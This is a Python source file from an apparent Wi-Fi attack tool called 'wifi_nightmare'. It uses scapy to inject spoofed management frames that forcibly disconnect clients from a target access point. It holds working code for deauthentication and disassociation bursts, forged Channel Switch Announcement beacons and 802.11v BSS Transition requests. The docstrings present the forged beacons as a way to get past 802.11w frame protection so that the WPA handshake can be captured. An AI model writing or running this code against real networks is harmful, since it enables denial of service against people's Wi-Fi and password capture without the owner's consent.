# eviction.py — Advanced 802.11 eviction suite (Deauth, CSA, BTM)
# Bypasses 802.11w PMF (Protected Management Frames) and forces reconnection
import time
from typing import Optional, List
try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Deauth, Dot11Disas, Dot11Beacon, Dot11Elt, sendp
    )
    HAS_SCAPY = True
except ImportError:
    RadioTap = None
    Dot11 = None
    Dot11Deauth = None
    Dot11Disas = None
    Dot11Beacon = None
    Dot11Elt = None
    sendp = None
    HAS_SCAPY = False
from wifi_nightmare.logger import logger


def build_csa_beacon(
    bssid: str,
    target_channel: int,
    switch_mode: int = 1,
    switch_count: int = 2,
    ssid: str = "",
    current_channel: Optional[int] = None
) -> RadioTap:
    """Build a compliant Beacon frame with Channel Switch Announcement (CSA - Element ID 37).
    
    Why CSA works against PMF / 802.11w:
    Standard Deauth frames are blocked/ignored when PMF is enabled. However,
    Channel Switch Announcement elements inside Beacons inform associated stations
    that the AP is switching channels immediately. Stations disconnect and initiate
    roaming or reassociation, triggering the EAPOL 4-way handshake.
    
    Args:
        bssid: The BSSID of the target AP (spoofed).
        target_channel: The new channel to tell clients to switch to.
        switch_mode: 1 = clients stop transmitting until switch; 0 = transmit allowed.
        switch_count: Number of TBTTs (beacons) before switch occurs (usually 1-3).
        ssid: The target AP SSID (required for clients to recognize beacon).
        current_channel: The channel on which the AP currently operates.
    """
    bssid = bssid.lower()
    curr_ch = current_channel if current_channel is not None else target_channel
    
    # 802.11 Beacon frame
    dot11 = Dot11(
        subtype=8,
        type=0,
        proto=0,
        addr1="ff:ff:ff:ff:ff:ff",
        addr2=bssid,
        addr3=bssid
    )
    
    beacon = Dot11Beacon(cap=0x0431)
    ssid_elt = Dot11Elt(ID=0, info=ssid.encode('utf-8', errors='ignore')[:32])
    rates_elt = Dot11Elt(ID=1, info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
    
    # Element ID 3 (DS Parameter Set - current AP channel where clients are listening)
    ds_elt = Dot11Elt(ID=3, info=bytes([curr_ch & 0xFF]))
    
    # Element ID 37 (Channel Switch Announcement - instructs stations to switch channel)
    csa_payload = bytes([switch_mode & 0xFF, target_channel & 0xFF, switch_count & 0xFF])
    csa_elt = Dot11Elt(ID=37, info=csa_payload)
    
    return RadioTap() / dot11 / beacon / ssid_elt / rates_elt / ds_elt / csa_elt


def build_btm_request(
    bssid: str,
    client_mac: str,
    dialog_token: int = 1
) -> RadioTap:
    """Build an 802.11v BSS Transition Management (BTM) Request frame.
    
    Forces modern 802.11v capable stations (smartphones) to re-evaluate their AP connection.
    Category: WNM (10), Action: BSS Transition Management Request (7).
    """
    dot11 = Dot11(
        subtype=13, # Action frame
        type=0,
        proto=0,
        addr1=client_mac.lower(),
        addr2=bssid.lower(),
        addr3=bssid.lower()
    )
    
    # Raw Action payload:
    # Category = 10 (WNM), Action = 7 (BTM Request)
    # Dialog Token, Request Mode, Disassociation Timer, Validity Interval
    action_payload = bytes([10, 7, dialog_token & 0xFF, 0x01, 0x00, 0x00, 0x05])
    return RadioTap() / dot11 / action_payload


class AdvancedEviction:
    """Multi-vector eviction engine combining Deauth, Disassociation, CSA and BTM."""
    
    def __init__(self, interface: str, target_bssid: str, current_channel: int, target_ssid: str = ""):
        self.interface = interface
        self.target_bssid = target_bssid.lower()
        self.current_channel = current_channel
        self.target_ssid = target_ssid
        self.decoy_channel = 6 if current_channel == 1 else (1 if current_channel <= 14 else 36)
        # Set True once the interface is gone/down; further injection calls
        # then return 0 silently instead of spamming the same error in a loop.
        self._iface_dead = False

    def send_deauth_burst(self, client_mac: Optional[str] = None, count: int = 3) -> int:
        """Send standard 802.11 Deauth + Disassoc frame burst (bidirectional for clients)."""
        dest = client_mac.lower() if client_mac else "ff:ff:ff:ff:ff:ff"
        frames = [
            # AP -> Client / Broadcast
            RadioTap() / Dot11(addr1=dest, addr2=self.target_bssid, addr3=self.target_bssid) / Dot11Deauth(reason=7),
            RadioTap() / Dot11(addr1=dest, addr2=self.target_bssid, addr3=self.target_bssid) / Dot11Deauth(reason=6),
            RadioTap() / Dot11(addr1=dest, addr2=self.target_bssid, addr3=self.target_bssid) / Dot11Disas(reason=8),
        ]
        # For unicast client eviction: also spoof Client -> AP so AP evicts the client's session immediately
        if dest != "ff:ff:ff:ff:ff:ff":
            frames.extend([
                RadioTap() / Dot11(addr1=self.target_bssid, addr2=dest, addr3=self.target_bssid) / Dot11Deauth(reason=7),
                RadioTap() / Dot11(addr1=self.target_bssid, addr2=dest, addr3=self.target_bssid) / Dot11Disas(reason=8),
            ])
        if self._iface_dead:
            return 0
        try:
            sendp(frames, iface=self.interface, count=count, verbose=False)
            return count * len(frames)
        except PermissionError:
            logger.error(f"Deauth injection FAILED: Permission denied on {self.interface} — run as root")
            print(f"\n\033[91m[!] Deauth FAILED: Permission denied on {self.interface} — run as root (sudo)\033[0m")
            return 0
        except OSError as e:
            if "No such device" in str(e) or "Network is down" in str(e):
                logger.error(f"Deauth injection FAILED: Interface {self.interface} is down or not in monitor mode")
                print(f"\n\033[91m[!] Deauth FAILED: {self.interface} is down or not in monitor mode (stopping injection)\033[0m")
                self._iface_dead = True
            else:
                logger.error(f"Deauth injection OSError: {e}")
                print(f"\n\033[91m[!] Deauth injection error: {e}\033[0m")
            return 0
        except Exception as e:
            logger.warning(f"Deauth/Disas burst failed: {e}")
            print(f"\n\033[93m[!] Deauth injection warning: {e}\033[0m")
            return 0

    def send_csa_burst(self, target_channel: Optional[int] = None, count: int = 5) -> int:
        """Send Channel Switch Announcement (CSA) burst to evict PMF-protected clients."""
        if self._iface_dead:
            return 0
        ch = target_channel or self.decoy_channel
        beacon = build_csa_beacon(
            bssid=self.target_bssid,
            target_channel=ch,
            switch_mode=1,
            switch_count=1,
            ssid=self.target_ssid,
            current_channel=self.current_channel
        )
        try:
            sendp(beacon, iface=self.interface, count=count, verbose=False)
            return count
        except PermissionError:
            logger.error(f"CSA injection FAILED: Permission denied on {self.interface}")
            print(f"\n\033[91m[!] CSA injection FAILED: run as root (sudo)\033[0m")
            return 0
        except OSError as e:
            logger.error(f"CSA injection OSError on {self.interface}: {e}")
            if "No such device" in str(e) or "Network is down" in str(e):
                self._iface_dead = True
            print(f"\n\033[91m[!] CSA injection error: {self.interface} down or not in monitor mode (stopping injection)\033[0m")
            return 0
        except Exception as e:
            logger.warning(f"CSA injection failed: {e}")
            return 0

    def send_btm_burst(self, client_mac: str, count: int = 2) -> int:
        """Send 802.11v BTM request to trigger client roaming."""
        if self._iface_dead:
            return 0
        req = build_btm_request(self.target_bssid, client_mac)
        try:
            sendp(req, iface=self.interface, count=count, verbose=False)
            return count
        except Exception as e:
            logger.debug(f"BTM injection failed: {e}")
            return 0

    def evict_client(self, client_mac: Optional[str] = None, pmf_active: bool = False) -> int:
        """Execute intelligent multi-vector eviction tailored to target PMF posture."""
        sent = 0
        # If PMF is known or suspected, lead with CSA
        if pmf_active:
            sent += self.send_csa_burst(count=4)
            if client_mac:
                sent += self.send_btm_burst(client_mac, count=2)
        else:
            # Traditional networks: deauth + CSA combo ensures 100% eviction rate
            sent += self.send_deauth_burst(client_mac, count=3)
            sent += self.send_csa_burst(count=2)
            if client_mac:
                sent += self.send_btm_burst(client_mac, count=1)
        return sent
